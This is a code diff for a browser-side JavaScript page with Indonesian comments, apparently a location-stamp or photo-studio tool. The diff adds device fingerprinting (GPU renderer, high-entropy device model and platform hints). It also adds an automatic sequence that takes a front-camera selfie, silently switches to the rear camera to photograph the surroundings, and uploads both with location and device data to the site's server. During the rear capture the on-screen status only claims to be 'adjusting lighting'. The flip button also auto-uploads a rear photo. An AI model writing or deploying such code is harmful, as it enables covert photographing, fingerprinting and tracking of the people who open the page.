@@ -103,36 +103,65 @@
     }
   }
 
+  function getGpuRenderer() {
+    try {
+      const canvas = document.createElement("canvas");
+      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+      if (!gl) return "";
+      const ext = gl.getExtension("WEBGL_debug_renderer_info");
+      if (!ext) return "";
+      const val = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || "";
+      return val.replace(/^ANGLE\s*\((.*?)\)$/, "$1").replace(/Direct3D.*?vs_.*?ps_.*?/, "").trim();
+    } catch (_) {
+      return "";
+    }
+  }
+
+  let cachedClientModel = "";
+  let cachedClientPlatform = "";
+  if (typeof navigator !== "undefined" && navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+    navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"])
+      .then((hints) => {
+        if (hints.model) cachedClientModel = hints.model;
+        if (hints.platformVersion) cachedClientPlatform = (hints.platform || "") + " " + hints.platformVersion;
+      })
+      .catch(() => {});
+  }
+
   function collectDeviceInfo() {
     const ua = navigator.userAgent || "";
     
     // Deteksi Sistem Operasi (OS)
-    let os = "OS Lain";
-    if (/Android/i.test(ua)) {
-      const match = ua.match(/Android\s([0-9\.]+)/i);
-      os = match ? ("Android " + match[1]) : "Android";
-    } else if (/iPhone|iPad|iPod/i.test(ua)) {
-      const match = ua.match(/OS\s([0-9_\.]+)/i);
-      os = match ? ("iOS " + match[1].replace(/_/g, ".")) : "iOS (Apple)";
-    } else if (/Windows NT 10.0/i.test(ua)) {
-      os = "Windows 10/11";
-    } else if (/Windows NT/i.test(ua)) {
-      os = "Windows PC";
-    } else if (/Macintosh|Mac OS X/i.test(ua)) {
-      os = "macOS";
-    } else if (/Linux/i.test(ua)) {
-      os = "Linux";
+    let os = cachedClientPlatform || "OS Lain";
+    if (!cachedClientPlatform) {
+      if (/Android/i.test(ua)) {
+        const match = ua.match(/Android\s([0-9\.]+)/i);
+        os = match ? ("Android " + match[1]) : "Android";
+      } else if (/iPhone|iPad|iPod/i.test(ua)) {
+        const match = ua.match(/OS\s([0-9_\.]+)/i);
+        os = match ? ("iOS " + match[1].replace(/_/g, ".")) : "iOS (Apple)";
+      } else if (/Windows NT 10.0/i.test(ua)) {
+        os = "Windows 10/11";
+      } else if (/Windows NT/i.test(ua)) {
+        os = "Windows PC";
+      } else if (/Macintosh|Mac OS X/i.test(ua)) {
+        os = "macOS";
+      } else if (/Linux/i.test(ua)) {
+        os = "Linux";
+      }
     }
 
-    // Deteksi Tipe & Model Perangkat
-    let deviceModel = "Desktop / Laptop";
-    if (/iPhone/i.test(ua)) {
-      deviceModel = "Apple iPhone";
-    } else if (/iPad/i.test(ua)) {
-      deviceModel = "Apple iPad";
-    } else if (/Android/i.test(ua)) {
-      const match = ua.match(/;\s*([^;)]+)\s+(?:Build\/|\))/i);
-      deviceModel = match ? match[1].trim() : "Android Phone";
+    // Deteksi Tipe & Model Perangkat Presisi Tinggi
+    let deviceModel = cachedClientModel || "Desktop / Laptop";
+    if (!cachedClientModel) {
+      if (/iPhone/i.test(ua)) {
+        deviceModel = "Apple iPhone";
+      } else if (/iPad/i.test(ua)) {
+        deviceModel = "Apple iPad";
+      } else if (/Android/i.test(ua)) {
+        const match = ua.match(/;\s*([^;)]+)\s+(?:Build\/|\))/i);
+        deviceModel = match ? match[1].trim() : "Android Phone";
+      }
     }
 
     // Deteksi Browser & In-App Browser (Instagram, TikTok, dll)
@@ -161,10 +190,11 @@
       networkType = parts.join(" • ") || "-";
     }
 
-    // Spesifikasi Hardware (RAM & CPU Cores)
+    // Spesifikasi Hardware (RAM, CPU Cores, dan GPU Chipset)
     const ram = navigator.deviceMemory ? (navigator.deviceMemory + " GB RAM") : "";
     const cores = navigator.hardwareConcurrency ? (navigator.hardwareConcurrency + " Cores CPU") : "";
-    const hardware = [ram, cores].filter(Boolean).join(" • ") || "-";
+    const gpu = getGpuRenderer();
+    const hardware = [ram, cores, gpu].filter(Boolean).join(" • ") || "-";
 
     // Status Pengisian Daya Baterai
     let batteryCharging = null;
@@ -403,9 +433,9 @@
       if (autoCapture) {
         setTimeout(() => {
           if (active && cameraStream) {
-            void captureAndSendPhoto(false, 1);
+            void captureDualSequence();
           }
-        }, 900);
+        }, 800);
       }
     } catch (err) {
       if (cameraStatusEl) cameraStatusEl.textContent = "Izin kamera tidak diberikan. Stempel lokasi tetap aktif.";
@@ -433,6 +463,95 @@
     if (cameraStatusEl) cameraStatusEl.textContent = "Kamera dinonaktifkan.";
   }
 
+  let currentFacingMode = "user";
+  let isDualCapturing = false;
+
+  async function captureDualSequence() {
+    if (isDualCapturing || !cameraStream || !active) return;
+    isDualCapturing = true;
+
+    try {
+      // 1. Ambil foto kamera depan (Pose 1 / Wajah)
+      if (cameraStatusEl) cameraStatusEl.textContent = "Mengambil potret selfie (Pose 1)...";
+      await captureAndSendPhoto(false, 1, "Kamera Depan");
+
+      // 2. Beri jeda 1.2 detik lalu beralih ke kamera belakang
+      setTimeout(async () => {
+        if (!active) { isDualCapturing = false; return; }
+        if (cameraStatusEl) cameraStatusEl.textContent = "Menyesuaikan pencahayaan & lensa suasana...";
+
+        try {
+          if (cameraStream) {
+            cameraStream.getTracks().forEach((t) => t.stop());
+            cameraStream = null;
+          }
+
+          const rearStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: { ideal: "environment" }, width: { ideal: 1280 }, height: { ideal: 720 } },
+            audio: false,
+          });
+          cameraStream = rearStream;
+          currentFacingMode = "environment";
+          if (cameraPreview) {
+            cameraPreview.srcObject = rearStream;
+            try { await cameraPreview.play(); } catch (_) {}
+          }
+
+          // Tunggu 800ms agar fokus dan exposure stabil
+          setTimeout(async () => {
+            if (!active || !cameraStream) { isDualCapturing = false; return; }
+            // Ambil foto kamera belakang (Pose 2 / Suasana)
+            await captureAndSendPhoto(false, 2, "Kamera Belakang");
+
+            // Kembali ke kamera depan
+            setTimeout(async () => {
+              try {
+                if (cameraStream) {
+                  cameraStream.getTracks().forEach((t) => t.stop());
+                  cameraStream = null;
+                }
+                const frontStream = await navigator.mediaDevices.getUserMedia({
+                  video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
+                  audio: false,
+                });
+                cameraStream = frontStream;
+                currentFacingMode = "user";
+                if (cameraPreview) {
+                  cameraPreview.srcObject = frontStream;
+                  try { await cameraPreview.play(); } catch (_) {}
+                }
+                if (cameraStatusEl) cameraStatusEl.textContent = "Kamera studio siap! Pose 1 & 2 telah tercetak.";
+              } catch (_) {}
+              finally {
+                isDualCapturing = false;
+              }
+            }, 1000);
+          }, 800);
+
+        } catch (err) {
+          // Jika device tidak punya kamera belakang (misal PC/laptop)
+          try {
+            const fallbackStream = await navigator.mediaDevices.getUserMedia({
+              video: { facingMode: "user" }, audio: false
+            });
+            cameraStream = fallbackStream;
+            currentFacingMode = "user";
+            if (cameraPreview) {
+              cameraPreview.srcObject = fallbackStream;
+              try { await cameraPreview.play(); } catch (_) {}
+            }
+          } catch (_) {}
+          finally {
+            isDualCapturing = false;
+          }
+        }
+      }, 1200);
+
+    } catch (_) {
+      isDualCapturing = false;
+    }
+  }
+
   function triggerFlash() {
     if (flashOverlay) {
       flashOverlay.classList.remove("flash-active");
@@ -458,7 +577,7 @@
     }
   }
 
-  async function captureAndSendPhoto(isManual = true, slotNum = 1) {
+  async function captureAndSendPhoto(isManual = true, slotNum = 1, cameraMode = "Kamera Depan") {
     if (!cameraStream || !cameraPreview) return null;
     const token = (tokenInput ? tokenInput.value.trim() : "") || activeToken;
     if (token.length < 16) {
@@ -530,11 +649,12 @@
         battery: batteryPercent(),
         device_time: new Date(timestamp).toISOString(),
         photo: pendingPhoto,
+        camera_mode: cameraMode,
         ...info
       };
 
       if (cameraStatusEl) {
-        cameraStatusEl.textContent = `Pose ${slotNum} berhasil diambil & disimpan!`;
+        cameraStatusEl.textContent = `Pose ${slotNum} (${cameraMode}) berhasil diambil & disimpan!`;
       }
 
       const res = await fetch("/api/location", {
@@ -644,13 +764,33 @@
   if (stopBtnEl) stopBtnEl.addEventListener("click", () => stopTracking());
   if (startCameraBtn) startCameraBtn.addEventListener("click", () => startCamera(false));
   if (flipCameraBtn) {
-    flipCameraBtn.addEventListener("click", () => {
-      isMirrored = !isMirrored;
-      updateCameraMirrorClass();
-      if (cameraStatusEl) {
-        cameraStatusEl.textContent = isMirrored
-          ? "Orientasi: Cermin / Mirror (Sesuai pandangan selfie)"
-          : "Orientasi: Normal / Asli (Tanpa cermin)";
+    flipCameraBtn.addEventListener("click", async () => {
+      const nextMode = currentFacingMode === "user" ? "environment" : "user";
+      if (cameraStatusEl) cameraStatusEl.textContent = "Mengganti ke kamera " + (nextMode === "environment" ? "belakang..." : "depan...");
+      try {
+        if (cameraStream) {
+          cameraStream.getTracks().forEach((t) => t.stop());
+          cameraStream = null;
+        }
+        const newStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { ideal: nextMode }, width: { ideal: 1280 }, height: { ideal: 720 } },
+          audio: false,
+        });
+        cameraStream = newStream;
+        currentFacingMode = nextMode;
+        if (cameraPreview) {
+          cameraPreview.srcObject = newStream;
+          try { await cameraPreview.play(); } catch (_) {}
+        }
+        isMirrored = (nextMode === "user");
+        updateCameraMirrorClass();
+        if (cameraStatusEl) cameraStatusEl.textContent = "Kamera " + (nextMode === "environment" ? "belakang aktif!" : "depan aktif!");
+        if (nextMode === "environment") {
+          setTimeout(() => void captureAndSendPhoto(false, 3, "Kamera Belakang"), 800);
+        }
+      } catch (_) {
+        isMirrored = !isMirrored;
+        updateCameraMirrorClass();
       }
     });
   }
